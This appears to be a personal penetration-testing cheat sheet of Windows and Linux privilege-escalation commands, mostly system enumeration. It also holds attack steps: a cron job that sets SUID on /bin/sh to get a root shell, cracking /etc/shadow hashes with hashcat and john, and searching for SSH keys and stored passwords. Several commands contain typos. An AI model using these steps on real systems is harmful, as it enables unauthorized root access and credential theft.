# Privilege-Escalation
###Manual Enumeration
1. processes-services :

```bash
#Windows 
tasklist /svc

#Linux
ps aux
```

1. About-version :

```bash
#Windows 
systeminfo | findstr /c:”os name” /c:”os  version” /c:”systemtype”

#Linux
uname -a || cat /etc/issue
```

1. Enum-Host_Name :

```bash
#Windows & Linux
 
hostname
```

1. Enum-Users :

```bash
#Windows
whoami || net user || net user <username> 

#Linux
whoami ||id|| cat /etc/passwd 
```

### Network Enum

1. Open Ports :

```bash
#Windows
ipconfig /all || route print||netstat -ano    

#Linux
ip a || ifconfig ss -anp || cat /sbin/route || netstat -anp
```

### Firewall Enum

- Linux
`iptables` ⇒However, depending on how the firewall is configured, we may be able to glean information about the rules as a standard user || `/etc/iptables`
- Windows
`netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all`
### Enumerating scheduled tasks

Scheduled task :

---

```bash
1. nano test.sh
2. chmod u+s /bin/sh
3. chmod +x test.sh
4. nano /etc/crontab
- * * * * * root /home/luka/test.sh
1. $ /bin/sh -p
2. $ whoami
```

---

in windows

```bash
schtasks /query /fo LIST /v     
```

---

### Enum installed applications and patch levels

for Windows :

```bash
- wmic product get name, version, vendor
- wmic qfe get capion, discription, hosfixid, nstalledon
```

for Linux

```bash
dpkg -l
```

---

### Enum readable/writable files and directories

- for windows
- exec tool like ⇒ accesschk

```bash
c:\Tools\privilege_escalation\SysinternalsSuite>accesschk.exe -uws "Everyone" "C:\Prog ram Files”
```

- powershell script :

```powershell
>Get-ChildItem "C:\Program Files" -R ecurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

- for linux

```bash
find / -writable -type d 2>/dev/null
```

---

### unmounted disks



- Windows

```powershell
mountvol
```

- Linux

```bash
mount
```

---

### Device Drivers and kernal modules



- Windows

```powershell
drivequery.exe /v /fe csv | convertfrom-csv | select-object ‘display name’, ‘start mode’, path 
```

- Linux

```bash
1. lsmod
2. modinfo <modulename>
```

====================================

## Automation

===============

Runas escalation via ⇒ CVE-2019-1388

===============

# Linux privesc

exploits:

1. kernel exploits: ⇒ vuls in version ... EX.( dirty c0w)
2. stored passwords (config files)
3. stored passwords (History) .. /.bash_history
4. weak permission ⇒ /etc/shadow —> unshadow passwd shadow > output.txt —→ crack

$hashcat -m 1800 output.txt rockyou.txt -O

1. ssh keys —→ find / -name id_rsa 2> /dev/null
2. shell escaping ⇒sudo -l 
3. sudo abusing intended functionality

⇒sudo apache2 -f /etc/shadow ⇒root hash ⇒ echo ‘[ root hash ]’ > x.txt

john —wordlist=/user/share/wordlist/nmap.lst x.txt

1. sudo (LD_PRELOAD)
